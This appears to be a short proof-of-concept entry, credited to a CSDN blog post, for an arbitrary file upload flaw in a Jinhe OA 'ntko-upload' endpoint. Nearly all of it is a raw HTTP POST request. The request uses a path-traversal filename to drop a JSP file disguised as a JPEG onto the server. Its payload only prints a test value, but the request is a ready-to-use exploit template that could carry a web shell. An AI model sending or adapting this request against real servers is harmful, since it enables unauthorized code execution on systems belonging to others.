# jinhe_ntko_upload_fileupload
2024/01/05
@2
from: https://blog.csdn.net/luochen2436/article/details/135369589
```
POST /jc6/ntkoUpload/ntko-upload!upload.action HTTP/1.1
Host: you_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Content-Length: 392
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----zqulxi4ku42pfmoelvc0
Connection: close

------zqulxi4ku42pfmoelvc0
Content-Disposition: form-data; name="filename"

../../../../upload/xicxc2sv1n.jsp
------zqulxi4ku42pfmoelvc0
Content-Disposition: form-data; name="upLoadFile"; filename="xicxc2sv1n.jpg"
Content-Type: image/jpeg

<% out.println(111*111); %>
------zqulxi4ku42pfmoelvc0
Content-Disposition: form-data; name="Submit"

upload
------zqulxi4ku42pfmoelvc0--
```
